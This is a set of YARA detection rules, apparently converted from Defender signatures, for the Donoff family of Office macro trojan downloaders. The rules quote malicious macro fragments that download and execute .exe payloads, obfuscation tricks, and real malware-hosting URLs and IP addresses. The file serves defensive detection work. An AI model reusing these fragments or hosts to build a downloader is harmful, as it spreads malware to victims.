rule TrojanDownloader_O97M_Donoff_C_2147689060_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.C"
        threat_id = "2147689060"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "DXCGFS = URLDownloadToFileA(0, MVVASZ, CGVHII, 0, 0)" ascii //weight: 1
        $x_1_2 = "MsgBox \"Este documento no es compatible con este equipo.\"" ascii //weight: 1
        $x_1_3 = {3c 20 33 30 30 [0-48] 3d 20 22 68 74 74 70 3a 2f 2f [0-64] 2e 65 78 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_C_2147689060_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.C"
        threat_id = "2147689060"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 41 75 74 6f 45 78 65 63 28 29 0d 0a 43 61 6c 6c 20 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 [0-16] 22 68 [0-5] 74 [0-5] 74 [0-5] 70 [0-64] 2e [0-5] 65 [0-5] 78 [0-5] 65 [0-5] 22 2c [0-16] 2e [0-5] 65 [0-5] 78 [0-5] 65}  //weight: 1, accuracy: Low
        $x_1_2 = {50 72 69 76 61 74 65 20 53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a 43 61 6c 6c 20 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 [0-16] 22 68 [0-5] 74 [0-5] 74 [0-5] 70 [0-64] 2e [0-5] 65 [0-5] 78 [0-5] 65 [0-5] 22 2c [0-16] 2e [0-5] 65 [0-5] 78 [0-5] 65}  //weight: 1, accuracy: Low
        $x_10_3 = {43 61 6c 6c 20 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 [0-16] 22 68 74 74 [0-5] 70 [0-5] 3a 2f 2f 77 77 77 2e 69 6e 74 65 72 74 65 63 6e [0-48] 2f 73 73 [0-5] 2e [0-5] 65 [0-5] 78 [0-5] 65 22 2c}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_A_2147689061_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.A"
        threat_id = "2147689061"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 04 00 23 49 66 20 57 69 6e 36 34 20 54 68 65 6e 04 00 14 00 04 00 23 45 6c 73 65 49 66 20 57 69 6e 33 32 20 54 68 65 6e 04 00 14 00 20 3d 20 22 14 00 22 04 00 14 00 20 3d 20 22}  //weight: 1, accuracy: Low
        $x_1_2 = {23 45 6c 73 65 04 00 23 45 6e 64 20 49 66 04 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_D_2147689063_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.D"
        threat_id = "2147689063"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 41 74 74 72 20 [0-10] 2c 20 76 62 4e 6f 72 6d 61 6c [0-16] 4b 69 6c 6c 20}  //weight: 1, accuracy: Low
        $x_1_2 = "= CreateObject(\"WinHttp.WinHttpRequest.5.1\")" ascii //weight: 1
        $x_1_3 = {2e 52 65 73 70 6f 6e 73 65 42 6f 64 79 [0-32] 2e 53 61 76 65 54 6f 46 69 6c 65 20 28 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c [0-8] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 68 65 6c 6c 28 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c [0-8] 2e 65 78 65 22 2c}  //weight: 1, accuracy: Low
        $x_1_5 = "= (Dir(FileToTest) <> \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cactusrefuse" ascii //weight: 1
        $x_1_2 = "pigeonunveil" ascii //weight: 1
        $x_1_3 = "armorlight" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {38 30 2e 32 34 32 2e 31 32 33 2e 31 35 35 2f 22 [0-8] 65 78 65 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://46.30.43.146/909.jpg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 70 6c 69 74 28 22 [0-48] 33 34 66 34 33 2b 62 75 68 75 35 2e 72 75 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {22 78 78 78 2d 36 43 48 7f 6f 1a 07 77 7a 19 07 7e 79 19 02 76 70 03 19 01 21 43 57 6b 25 4f 53 22}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://thewelltakeberlin.com/92.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "nzzv://suxkroqkyzujge.ius/ulloik.kdk" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+ \"46.30.41\" + \".150/\" + \"bb.ty\" + \"p\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"kwws=22<4155<1:<1564=;3;32456661h{h\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (qau.aoi.Text & wpvmbiudhmceufab)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://ads-letter.info/client_script.js" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "twm1qP5X34eq.Open \"poST\", bt9tzD.J3jEet1U5" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "yos/mtcpp.i.tiwcdtow/nhew1ieg/.mm//2x/m:va" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_13
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "OA^D\" + " ascii //weight: 1
        $x_1_2 = "'%Ap\" + " ascii //weight: 1
        $x_1_3 = " = \"XE " ascii //weight: 1
        $x_1_4 = "ttp:\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_14
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "beesteriphudilulunpecharakkees\\pm.j\\\\:sptth" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_15
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 56 42 41 2e 53 68 65 6c 6c 28 [0-10] 20 26 20 [0-10] 20 26 20 22 20 22 20 26 20 [0-10] 2c 20 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_16
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"dolphin2000.ir/tmp/\"" ascii //weight: 1
        $x_1_2 = "\"gnf.jotpee.de/tmp/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_17
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "XB7d = (SoXr And Not QQK) Or (Not SoXr And QQK)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_18
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {22 47 45 54 22 2c 20 aa a3 b4 a6 a7 af af b3 b7 be b0 bc a1 be a6 b2 a6 a7 ab a1 a2 bb b2 b8 bc b9 af a5 a4 b9 ba bf a2 ac b5 be b3 b6 ae a8 af}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_19
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 ae a3 b5 a2 a4 a7 b4 b2 bf b6 bc bf bd aa a1 b0 bc bd ab b3 a9 b9 ae b6 ba a9 a5 ab b8 b5 b6 b5 b8 a2 a6}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_20
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://darkbreak.webcindario.com/update/myapp.zip" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_21
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "StrReverse(\"e.tsohnvs\\pmeT\\lacoL\\%ATADPPA%\") & \"xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_22
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \".e^\"" ascii //weight: 1
        $x_1_2 = " = \".ex\"" ascii //weight: 1
        $x_1_3 = {53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_23
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"CMd.\"" ascii //weight: 1
        $x_1_2 = "= \"tp:/\"" ascii //weight: 1
        $x_1_3 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_24
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"aHR0cDovL3d3dy5iYXRhdGEyMDE1LmNvbS9hYmMvZS5kYXQ=\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_25
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " + \"top/httpd/\"" ascii //weight: 1
        $x_1_2 = {3d 20 22 74 22 20 2b 20 22 74 22 [0-21] 20 3d 20 22 70 22 20 2b 20 22 3a 22 20 2b 20 22 2f 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_26
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"'%aPpDAT\"" ascii //weight: 1
        $x_1_2 = "\"ted.exe'\"" ascii //weight: 1
        $x_1_3 = "\"CMD.eXE \"" ascii //weight: 1
        $x_1_4 = "\"eb^cLiEn\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_27
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 22 68 74 74 70 3a 2f 2f 65 72 6c 73 68 61 72 64 77 61 72 65 63 6f 2e 63 6f 6d 2f 01 00 2f 05 00 2e 65 78 65 22 22 3e 3e 05 00 2e 56 42 53}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_28
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 [0-16] 28 29 [0-16] 20 3d 20 55 73 65 72 46 6f 72 6d 31 2e 4c 69 73 74 31 2e 54 61 67 [0-8] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_29
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "safetreehunt" ascii //weight: 1
        $x_1_2 = "\", \"TOUCHB\", \"om\")" ascii //weight: 1
        $x_1_3 = ", \"TOUCHC\", \".\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_30
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "40"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "URLDownloadToFileA" ascii //weight: 10
        $x_10_2 = "Shell" ascii //weight: 10
        $x_10_3 = ".exe\"," ascii //weight: 10
        $x_10_4 = "bookmyroom.pk" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_31
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tu/v6?:twwsoxexpzr1d/lh5g1.demp/zsp1e.d/oi7d.ec1fatq/b=ow" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_32
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"wxeeihzpypzdo8.s:/rwmt/te1g=holc3bolks/w/?ngxxoddc.wx1/.\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_33
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 52 75 6e 20 4a 6f 69 6e 28 [0-16] 2c 20 [0-16] 29 2c 20 [0-8] 0d 0a}  //weight: 1, accuracy: Low
        $x_1_2 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_34
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
